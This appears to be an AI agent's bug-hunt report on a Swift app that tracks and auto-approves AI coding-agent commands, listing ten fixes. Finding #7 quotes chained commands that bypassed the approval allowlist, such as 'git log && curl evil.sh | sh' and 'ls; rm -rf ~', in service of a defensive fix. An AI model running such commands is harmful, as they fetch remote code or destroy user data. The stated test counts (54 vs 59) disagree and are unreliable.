# Bug Hunt — Findings & Fixes

Date: 2026-05-30
Scope: the active Swift app (`app/`), exercised against ARCHITECTURE.md's documented
feature set and the ESP32 firmware (`src/outputs/esp32/firmware/`).

Method: full static read of every source file in `app/Buddygotchi`, the two hook CLIs,
and the tests; `swift build` + `swift test` (51 tests green at baseline, 54 green after);
launched the real binary (HTTP server comes up on `127.0.0.1:21321`, no crash). The bash
tool sandbox blocks outbound localhost sockets, so live HTTP probing wasn't possible —
core behavior was instead pinned with new reducer unit tests and cross-checked against the
firmware that consumes the heartbeat.

---

## Fixed

### 1. Default species `"bufo"` doesn't exist — wrong/stale buddy on hardware
**File:** `app/Buddygotchi/Core/BuddyState.swift`
**Severity:** High (visible on hardware + nondeterministic fallback)

`Pet.defaultSpecies` was `"bufo"`, but `allBuddies` (and `buddyOrder`) only contain the five
documented species: `cat, axolotl, robot, capybara, dragon`. `"bufo"` appeared nowhere else
in the app.

Consequences:
- `renderState` (ESP32 heartbeat) sends `UserDefaults["buddySpecies"] ?? state.pet.species`.
  Before the user finishes onboarding (`buddySpecies` unset), the device receives species
  `"bufo"`. The firmware's `buddySetSpecies()` silently **no-ops on an unknown name**
  (its registry has no bufo), so the M5Stack shows the wrong/stale species (capybara at
  index 0) while the menu bar shows `cat`.
- `buddySpeciesColor(for:)` and `PetStageView.buddy` fall back to `allBuddies.values.first!`
  for `"bufo"` — dictionary order, i.e. nondeterministic.

**Fix:** `defaultSpecies = "cat"` — aligns the engine default with the `@AppStorage`/wizard
default and the documented species set.
**Test:** `testDefaultSpeciesIsAKnownSpecies` (fails on old `"bufo"`).

### 2. Heartbeat message labeled with the wrong agent (multi-session)
**File:** `app/Buddygotchi/Core/BuddyReducer.swift` (`aggregate`)
**Severity:** Medium (only with ≥2 simultaneous waiting sessions)

The displayed prompt is the *oldest* waiting request (`waiting.min(by: arrivedAt)`), but the
message source was taken from `waiting.first?.source` — an arbitrary session in dictionary
order. With two agents waiting at once, the heartbeat `msg` could be labeled `[claude-code]`
while actually showing Cursor's prompt.

**Fix:** label `msg` with the displayed prompt's own source: `source: p.source ?? ""`.
**Test:** `testMsgUsesDisplayedPromptSourceNotArbitrarySession`.

### 3. Stale prompt text lingers on the hardware after a prompt resolves
**File:** `app/Buddygotchi/Core/BuddyReducer.swift` (`aggregate`)
**Severity:** Medium (hardware display)

`aggregate` only ever wrote `buddy.msg` in the disconnected branch (`""`) and the attention
branch (the prompt text). In the busy / celebrate / idle branches it left `msg` untouched, so
after an approval/request resolved, `state.msg` kept the old tool text. `msg` is consumed
**only** by the ESP32 heartbeat (`Heartbeat.swift`), so the device kept showing e.g.
`[claude-code] Bash: rm -rf` while the pet was already busy or idle.

**Fix:** clear `buddy.msg = ""` in the busy, celebrate, and idle branches so the message only
reflects a currently-pending prompt. (No effect on the menu bar — it never reads `msg`.)
**Test:** `testMsgClearsWhenPromptResolves` (fails on old code).

### 4. "Local Approval Mode" toggle row mis-aligned in Settings
**File:** `app/Buddygotchi/Views/SettingsView.swift`
**Severity:** Low (cosmetic, but visible)

`BuddySettingToggle` already applies `.padding(.horizontal, 12).padding(.vertical, 10)`
internally. The Local Approval Mode row added a **second** identical padding on top, so that
one row was inset further than "Launch at Login" / "Interactive Mode" and its divider spacing
was off.

**Fix:** removed the duplicate `.padding(...)` modifiers from that row.

### 5. Nondeterministic fallback for an unknown species
**Files:** `app/Buddygotchi/Views/PetStageView.swift`, `app/Buddygotchi/Theme/BuddyTheme.swift`
**Severity:** Low (defensive)

Both the pet renderer and the species-color helper fell back to `allBuddies.values.first!`
when a species key wasn't found (e.g. a species string left over from an older build). That's
dictionary-order dependent.

**Fix:** fall back to `allBuddies[Pet.defaultSpecies]` first (a stable, known species), then
`values.first!` only as a last resort.

### 6. Cursor sessions never deregister on close (phantom "connected" for 10 min)
**Files:** `app/BuddygotchiSignal/SignalCLI.swift`, `app/Buddygotchi/Server/HookServer.swift`
**Severity:** High (contradicts a core documented behavior)

ARCHITECTURE.md says Cursor `sessionEnd` → "deregister session", and the app is supposed to
go to **sleep** when no agents are connected. But:
- `SignalCLI` mapped Cursor `sessionEnd` → `stop_working`.
- `/hook/signal` *always* calls `engine.sessionStarted(...)` first (re-registering the
  session) and never calls `sessionEnded`. It also receives no PID, so — unlike Claude Code /
  Codex — there's no process watcher to reap it.

Net effect: closing Cursor left a phantom connected/idle session that only disappeared via the
10-minute stale timeout. The menu bar kept showing "connected / N active" and the pet stayed
`idle` instead of `sleep`.

**Fix:**
- `SignalCLI`: map Cursor `sessionEnd` → a dedicated `"session_end"` signal.
- `/hook/signal`: when `signal == "session_end"`, call `engine.sessionEnded(sessionId:)` and
  return — *before* the re-register step.

No `hooks.json` reinstall is required: the event→binary mapping is unchanged; only the
compiled binary's internal map and the server handler changed. The `engine.sessionEnded` path
is already covered by `testSessionEndDisconnects`.

### 7. Auto-approve allowlist bypassable by command chaining (security)
**File:** `app/Buddygotchi/Server/HookServer.swift` (`shouldAutoApprove`)
**Severity:** High (security — silent auto-approval of dangerous commands)

In local approval mode, Cursor shell commands are checked against a "safe" allowlist
(`^(ls|cat|…)`, `^git (status|log|…)`). The patterns were matched against the **full command
string** with only a `\b` boundary, so a safe prefix could smuggle a second command that was
then **auto-approved with no prompt**:

- `ls; rm -rf ~` → matches `^ls\b` → auto-allowed
- `git log && curl evil.sh | sh` → matches `^git log\b` → auto-allowed
- `cat x | sh`, `echo hi > /etc/hosts`, `` cat `whoami` ``, `ls $(rm -rf ~)` → all auto-allowed

**Fix:** before consulting the allowlist, reject any command containing shell control
operators (`; & | ` `` ` `` `$ ( ) < >` newline). Such commands now require manual approval.
This only ever *removes* auto-approvals (fail-safe toward asking) — it can never turn a
previously-denied command into an allow.
**Tests:** `AutoApproveTests` (chaining/piping/redirection/substitution all return `nil`;
genuine single commands still auto-approve).

### 8. Cursor's approval and activity paths derive different session IDs
**Files:** `app/Buddygotchi/Server/HookServer.swift`
**Severity:** Medium–High (Cursor shows as two sessions; approval session lingers 10 min)

Cursor's hook payloads carry `conversation_id` (and **no** `session_id` — confirmed in
`external_sites/cursor_hooks.md`). The signal path (`SignalCLI` → `/hook/signal`) normalizes
the id to `conversation_id`, but `HookEventBody` (used by `/hook/approve`) didn't decode
`conversation_id`, so `deriveSessionId` fell through to `cursor_<hash(cwd)>`.

Net effect for Cursor in approval mode: the approval attaches to a *different* session than
the one tracking activity → one Cursor instance counts as two sessions, and the approval
session never receives the stop/end signals (they target the `conversation_id` session), so it
lingers until the 10-minute stale timeout.

**Fix:** decode `conversation_id` in `HookEventBody` and make
`deriveSessionId = session_id ?? conversation_id ?? "<source>_<hash(cwd)>"`. Claude Code
(sends `session_id`) and Codex (sends `session_id`) are unaffected.

### 9. `BLEManager` data races across the main actor / `bleQueue` boundary
**File:** `app/Buddygotchi/Outputs/ESP32/BLEManager.swift`
**Severity:** Medium (hardware path; intermittent corruption/crashes under disconnect/reconnect)

The type documented "all mutable state is accessed on `bleQueue`," but several `@MainActor`
entry points touched that state directly off-queue:
- `send()` read `rxCharacteristic` / `connectedPeripheral` on the caller before dispatching
  (these are written on `bleQueue` in characteristic discovery / disconnect).
- `connect()` / `disconnect()` mutated `targetPeripheralIdentifier`, `reconnectWorkItem`,
  `reconnectDelay` off-queue (read on `bleQueue` by `startConnecting` / `scheduleReconnect`).
- `startScan()` / `stopScan()` assigned `scanContinuation` off-queue (read on `bleQueue` by
  discovery callbacks).

These are textbook data races on `CBPeripheral`/`CBCharacteristic` references — the kind that
surface as occasional crashes or dropped writes during connect/disconnect churn.

**Fix:** moved every shared-field access into `bleQueue.async` blocks so the documented
invariant actually holds. `connectionState` remains the single published property, written
only on the main actor (delegate-driven writes already hop there via `Task { @MainActor }`).
Behavior is preserved; ordering is now well-defined. (No device on hand — verified by build +
reasoning, not hardware.)

### 10. Codex stayed `idle` while running tools (`PreToolUse` ignored)
**File:** `app/Buddygotchi/Server/HookServer.swift` (`handleAgentEvent`)
**Severity:** Low–Medium (Codex activity visualization)

The installer registers a `PreToolUse` hook for Codex, but `handleAgentEvent` had no
`PreToolUse` case — so it fell through to `default` (session touch only). Codex therefore
showed `idle` while a tool was actually running and only flipped to `busy` *after* the tool
finished (`PostToolUse`). Claude Code doesn't install `PreToolUse` and Cursor's `preToolUse`
goes through `SignalCLI`, so this path is Codex-only.

**Fix:** added `case "PreToolUse": activitySignal(.keepWorking)` so the pet shows busy while
the tool runs. `keepWorking` preserves `workStartedAt`, so celebrate-duration timing is
unaffected.

---

## Found but intentionally NOT changed (with rationale)

- **`BuddygotchiHook` CLI POSTs to a nonexistent `/hook/request` route.** This binary is
  legacy — the installer wires Claude Code through the `buddygotchi-hook.sh` bash script
  (`/hook/event` + `/hook/approve`) and Cursor through `BuddygotchiSignal`. Nothing in the
  active install path invokes `BuddygotchiHook`, and `removeLegacyHooks` strips references to
  it. Fixing it would mean either adding a dead route or deleting the target — out of scope
  for a behavior-preserving bug pass.

- **Two stacked approvals on one session orphan the first continuation.** A second
  `submitApproval` for the same session overwrites the session's prompt, so the first
  request's continuation can only be resolved by toggle-off or session-end. Not reachable in
  practice: Claude Code / Cursor block the agent on a permission request, so a single session
  never has two outstanding approvals.

- **Passive-mode deny leaves `attention` until the next `Stop`.** In passive (non-approval)
  mode there is no "denied" hook event, so a denied tool call clears only when the agent next
  fires `Stop`/`PostToolUse`. Pre-existing design gap; no event to key off of.

- **Setup wizard doesn't stop the BLE scanner when navigating *Back* from the output step.**
  Minor battery/resource use; the scanner is stopped on Next and on output-target change.

- **Doc vs. impl: Claude Code `Stop` maps to `celebrate`** (the ARCHITECTURE table implies
  `Stop` → stop working, `TaskCompleted` → celebrate). The active `/hook/event` path
  celebrates on `Stop`, which is reasonable UX ("task finished") and gated to silent/no-popup
  for sub-30s tasks. Left as-is; noted as a documentation discrepancy.

- **`celebrateUntil` lingers into busy/attention, so the heartbeat's `celebrate` flag can be
  `true` while `pet` is `busy`.** It's only cleared on expiry (stale tick) or when settling to
  idle, not when busy/attention preempts the celebrate window. The menu bar is unaffected (it
  keys off `pet.state`); only the ESP32 `celebrate` boolean is briefly stale. Left as-is —
  the reducer tests encode "celebrate can resume after a brief busy interruption."

---

## Verification

- `swift build` — clean.
- `swift test` — **59 passed, 0 failed** (51 pre-existing + 8 new regression tests across
  `ReducerTests` and `AutoApproveTests`).
- The two deterministic reducer regressions (`testDefaultSpeciesIsAKnownSpecies`,
  `testMsgClearsWhenPromptResolves`) were confirmed to **fail against the pre-fix code**.
- Launched the rebuilt binary: menu-bar app starts, Hummingbird listens on
  `127.0.0.1:21321`, no crash, empty error log.

> Environment note: the bash tool sandbox blocks GUI interaction and outbound localhost
> sockets, so the SwiftUI popover/wizard and the end-to-end hook→HTTP→output flow are
> verified by code analysis + unit tests rather than by live clicking/curl.

## Tooling

`app/tools/e2e-smoke.sh` (+ `app/tools/e2e/`) — end-to-end smoke suite you run in your own
terminal (real localhost access). A master runner does the core HTTP-contract checks, then
runs one suite per agent (each also runnable standalone), exhaustively over every event each
agent's hook path produces and asserting on the live `/healthz` state and `/hook/approve`
responses:

- `e2e/lib.sh` — shared helpers/assertions (incl. a `parked_approve` that verifies the
  **blocking approval round-trip** and the **fail-open invariant**: a session dying mid-approval
  resolves the hook to `allow`).
- `e2e/claude.sh` — `/hook/event`: SessionStart, UserPromptSubmit, PostToolUse, Stop,
  StopFailure, PermissionRequest, all three `Notification` types, Elicitation/ElicitationResult,
  SessionEnd, + blocking approve.
- `e2e/codex.sh` — `/hook/event`: lifecycle incl. **`PreToolUse`** (#10), PermissionRequest,
  + blocking approve.
- `e2e/cursor.sh` — `/hook/signal` (all four mapped signals incl. `session_end` #6) +
  `/hook/approve` (tool allowlist, safe shell, and a chained command that must block #7;
  approval + activity unified on one session via `conversation_id` #8).
- `e2e-smoke.sh` — master: core contract (healthz fields, no-op `SessionEnd`) + runs all three.

```sh
(cd app && swift run Buddygotchi) &   # if not already running
app/tools/e2e-smoke.sh                # everything
app/tools/e2e/cursor.sh               # or one agent
```

Not observable over HTTP (covered by the unit tests instead): pet-state priority/aggregation,
session counts, the DENY response format (needs the popover/BLE), the SessionStart
process-watcher reap, and the BLE output path. Confirmed passing live on the earlier
single-file version (`8 passed, 0 failed`).
